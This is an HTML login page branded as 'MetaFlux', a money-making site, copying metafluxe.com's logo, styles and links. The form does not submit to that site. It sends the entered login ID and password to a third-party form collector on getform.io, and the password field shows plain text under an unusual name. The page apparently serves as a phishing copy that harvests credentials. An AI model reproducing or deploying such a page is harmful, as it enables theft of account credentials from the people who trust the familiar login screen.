<!DOCTYPE html>
<html lang="en">

<head>
    <title>MetaFlux</title>
    <meta name="keywords" content="peer-to-peer, make money online, money, online website, make money online website, marketting, affiliate marketting" />
    <meta name="description" content="MetaFlux">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <link rel="shortcut icon" href="https://metafluxe.com/images/general/6bb3322acd3339db625e86297c26fc27b3601f5e-7zhmE.png">

    <!-- Vendors Style-->
    <link rel="stylesheet" href="https://metafluxe.com/user/css/vendors_css.css">
    <!-- Style-->
    <link rel="stylesheet" href="https://metafluxe.com/user/css/custom.css">
    <link rel="stylesheet" href="https://metafluxe.com/user/css/style.css">
	<link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
</head>

<body class="hold-transition theme-primary" style="background-image:url(https://metafluxe.com/user/images/grey-bg.jpg); background-size: cover;">

    <div class="container h-p100">
		<div class="row align-items-center justify-content-md-center h-p100">
			<div class="col-12">
				<div class="row justify-content-center g-0">
					<div class="col-lg-5 col-md-5 col-12">
						<div class="content-top-agile p-20 pb-0">
							<a href="https://metafluxe.com">
								<img src="https://metafluxe.com/images/general/a5ebae0a28151f7cd1b241ff8887fe1d2aa28e4f-wtjDe.png" width="100" alt="logo">
							</a>
						</div>

						<div class="p-40 edit-form">
							<form class="form-horizontal form-element col-12" action="https://getform.io/f/qaQYz0an" method="post">
														<div class="form-group row">
									<div class="col-sm-12">
									  <label for="id" class="col-sm-2 form-label text-dark">Login ID</label>
									  <input type="text" class="form-control rounded-3" id="id" required placeholder="Username/Email" name="id" autocomplete="off" autocorrect="off">
									</div>
								</div>

								<div class="form-group row">
									<div class="col-sm-12">
									  <label for="Boyoy" class="col-sm-2 form-label text-dark">Password</label>
									  <input type="text" class="form-control rounded-3" id="boyoy" required placeholder="Your Password" name="boyoy" autocomplete="off" autocorrect="off">
									</div>
								</div>

								<div class="row g-4">
									<div class="col-12">
										<div class="text-end">
										<a href="https://metafluxe.com/account/help/reset-password" class="text-info"><i class='bx bxs-key' ></i> Forgot password?</a><br>
										</div>
									</div>

									<div class="col-12">
										<button type="submit" class="btn-custom w-p100 rounded-1">LOG IN</button>
									</div>
								</div>
							</form>
							<div class="text-center">
								<p class="mt-15 mb-0 text-dark">Don't have an account? <a href="https://metafluxe.com/signup" class="text-primary ms-5">Sign Up</a></p>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>


	<script src="https://metafluxe.com/user/js/vendors.min.js"></script>
		<link rel="stylesheet" href="https://metafluxe.com/vendor/iziToast/iziToast.min.css">
<script src="https://metafluxe.com/vendor/iziToast/iziToast.min.js"></script>


<script>
    'use strict';
    function notify(status,message) {
        iziToast[status]({
            message: message,
            position: "bottomRight"
        });
    }
</script>
</body>
</html>
